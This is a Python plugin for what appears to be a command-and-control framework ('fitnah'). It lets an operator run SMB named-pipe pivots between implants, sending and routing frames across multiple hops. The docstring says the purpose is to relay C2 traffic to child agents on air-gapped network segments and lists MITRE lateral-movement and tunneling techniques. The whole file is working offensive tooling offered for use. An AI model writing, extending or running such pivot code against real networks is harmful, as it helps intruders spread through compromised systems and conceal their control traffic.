"""
smb_pivot — SMB named pipe P2P pivot — multi-hop mesh edition

Exposes pivot operations to the operator console.  The implant side is
implemented in fitnah/implant/pivot/smb_pivot.c (PivotListen / PivotConnect /
PivotSend / PivotPoll / PivotAddRoute / PivotDelRoute).

Multi-hop mesh frame format (since v2):
  [MAGIC:4][dst_id:4][src_id:4][ttl:1][payload_len:4][payload]
  MAGIC = 0x46495448 ("FITH")

The routing table lets the operator configure N-hop paths:
  route_add dst=<id> via=<direct_neighbour_id>  → forward-to
  route_del dst=<id>                             → remove route
  route_list                                     → show routing table

MITRE: T1090.001 (Proxy: Internal Proxy — named pipe)
       T1572     (Protocol Tunneling)
"""

from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.context import PluginContext
from fitnah.sdk.result import ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class SmbPivot(BasePlugin):
    NAME        = "smb_pivot"
    DESCRIPTION = (
        "SMB named-pipe P2P pivot — multi-hop mesh routing; relay C2 traffic "
        "to child agents on air-gapped segments (Havoc wire-compatible)"
    )
    MITRE       = "T1090.001,T1572"
    CATEGORY    = "lateral_movement"

    schema = ParamSchema().add(
        Param("action", str, required=True,
              help="listen | connect | list | remove | send | "
                   "route_add | route_del | route_list"),
        Param("pipe", str, required=False, default="",
              help="Pipe suffix for listen (e.g. 'abc123') "
                   "or full UNC path for connect"),
        Param("agent_id",      str, required=False, default="",
              help="Agent ID (hex or decimal) for remove / send"),
        Param("data",          str, required=False, default="",
              help="Base64-encoded payload bytes for send"),
        Param("dst_agent_id",  str, required=False, default="",
              help="Destination agent ID for route_add / route_del"),
        Param("via_agent_id",  str, required=False, default="",
              help="Next-hop agent ID for route_add"),
    )

    def run(self, session, params, ctx: PluginContext = None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action = params.get("action", "").lower()

        # ── listen ─────────────────────────────────────────────────────────
        if action == "listen":
            suffix = params.get("pipe", "")
            if not suffix:
                return ModuleResult.err("pipe required for listen")
            r = ctx.send("smb_pivot_listen", {"pipe_suffix": suffix})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("msg", "smb_pivot_listen failed"))
            agent_id = r.get("agent_id", 0)
            return ModuleResult.ok(
                data=f"Listening on pipe fitnah_{suffix} — child agent_id={agent_id:#x}"
            )

        # ── connect ────────────────────────────────────────────────────────
        elif action == "connect":
            pipe = params.get("pipe", "")
            if not pipe:
                return ModuleResult.err("pipe (full UNC path) required for connect")
            r = ctx.send("smb_pivot_connect", {"pipe_name": pipe})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("msg", "smb_pivot_connect failed"))
            agent_id = r.get("agent_id", 0)
            return ModuleResult.ok(
                data=f"Connected to {pipe} — agent_id={agent_id:#x}"
            )

        # ── list ───────────────────────────────────────────────────────────
        elif action == "list":
            r = ctx.send("smb_pivot_list", {})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("msg", "smb_pivot_list failed"))
            return ModuleResult.ok(data=str(r.get("pivots", [])))

        # ── remove ─────────────────────────────────────────────────────────
        elif action == "remove":
            aid = params.get("agent_id", "")
            if not aid:
                return ModuleResult.err("agent_id required for remove")
            r = ctx.send("smb_pivot_remove", {"agent_id": int(aid, 0)})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("msg", "smb_pivot_remove failed"))
            return ModuleResult.ok(data=f"Pivot {aid} removed")

        # ── send ───────────────────────────────────────────────────────────
        elif action == "send":
            aid      = params.get("agent_id", "")
            data_b64 = params.get("data", "")
            if not aid:
                return ModuleResult.err("agent_id required for send")
            if not data_b64:
                return ModuleResult.err("data (base64) required for send")
            r = ctx.send("smb_pivot_send",
                         {"agent_id": int(aid, 0), "data_b64": data_b64})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("msg", "smb_pivot_send failed"))
            return ModuleResult.ok(data="Frame sent")

        # ── route_add ──────────────────────────────────────────────────────
        elif action == "route_add":
            dst = params.get("dst_agent_id", "")
            via = params.get("via_agent_id", "")
            if not dst:
                return ModuleResult.err("dst_agent_id required for route_add")
            if not via:
                return ModuleResult.err("via_agent_id required for route_add")
            r = ctx.send("smb_pivot_route_add",
                         {"dst_agent_id": int(dst, 0), "via_agent_id": int(via, 0)})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("msg", "route_add failed"))
            return ModuleResult.ok(
                data=f"Route added: dst={dst} via={via}"
            )

        # ── route_del ──────────────────────────────────────────────────────
        elif action == "route_del":
            dst = params.get("dst_agent_id", "")
            if not dst:
                return ModuleResult.err("dst_agent_id required for route_del")
            r = ctx.send("smb_pivot_route_del", {"dst_agent_id": int(dst, 0)})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("msg", "route_del failed"))
            return ModuleResult.ok(data=f"Route to {dst} removed")

        # ── route_list ─────────────────────────────────────────────────────
        elif action == "route_list":
            r = ctx.send("smb_pivot_route_list", {})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("msg", "route_list failed"))
            routes = r.get("routes", [])
            if not routes:
                return ModuleResult.ok(data="No routes configured")
            lines = [f"  dst={rt['dst']:#x}  via={rt['via']:#x}" for rt in routes]
            return ModuleResult.ok(data="Routing table:\n" + "\n".join(lines))

        else:
            return ModuleResult.err(
                f"Unknown action '{action}'. "
                "Choose: listen, connect, list, remove, send, route_add, route_del, route_list"
            )
